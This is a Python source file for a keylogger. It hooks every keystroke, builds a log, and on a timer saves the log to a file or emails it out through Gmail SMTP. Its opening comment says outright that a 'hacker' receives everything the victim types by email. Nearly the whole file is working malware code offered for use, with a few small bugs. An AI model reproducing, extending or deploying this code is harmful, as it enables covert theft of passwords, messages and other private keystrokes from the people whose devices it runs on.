# A keylogger records all you do and stores it in a text file. As long as your data connection is a ON and a keylogger 
# is installed in your device the hacker will get what soever you do through an email wherever he is..
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an 'interval' amount of time
from threading import Timer
from datetime import datetime
import os
os.chdir("C:/Users/User/OneDrive/Desktop/YouTube/Keylogger")
print('path:',os.getcwd())
SEND_REPORT_EVERY = 120 # in seconds, 60seconds means 1 minutes and so on. Inorder to get what someone does in a whole day \n          
EMAIL_ADDRESS = ''      # we need to set the time to 24hrs but you've to convert the time to seconds.                                                   
EMAIL_PASSWORD = ''
# If you insert your mail as a file path the whole txt will be stored in your mail aswell
class Keylogger:
    def __init__(self, interval, report_method='email'):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within 'self.interval'
        self.log = ''
        # record start 6 & end  datetime
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """

        This callback is invoked whenever a keyboard event is occurred
        (i.e when a key is released in ths example)
        """

        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == 'space':
                # " "insteadb of 'space'
                name = " "
            elif name == 'enter':
                # add a new line whenever an ENTER is pressed
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f'[{name.upper()}]'
        # finally, add the key name to our global 'self.log' variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace('', '-').replace(':', '')
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(':', '')
        self.filename = f'keylog-{start_dt_str}_{end_dt_str}'

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the 'self.log' variable"""
        # open the file in write mode (create it)
        with open(f'{self.filename}.txt', 'w') as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f'[+] Saved {self.filename}.txt')

    def sendmail(self, email, password, message):
        # manages connection to an SMTP server
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send  the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every 'self.interval'
        It basically sends keylogs and resets 'self.log' variables
        """
        if self.log:
            # if there ias something in log, report it
            self.end_dt = datetime.now()
            # update 'self.filename'
            self.update_filename()
            if self.report_method == 'email':
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == 'file':
                self.report_to_file()
            # if you want to print in the console, uncomment the below line    
            print(f'[{self.filename}] - {self.log}')
            self.start_dt = datetime.now()
        self.log =  ''
        timer = Timer(interval=self.interval, function=self.report)
        # setthe thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start() 

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f'{datetime.now()} - Started keylogger')
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()       

if __name__ == '__main__':
    # if you want a keylogger  to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method='email')
    # if you want a keylogger to record keylogs to a local files
    # (and then send it using your favourite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method='file')
    keylogger.start()         

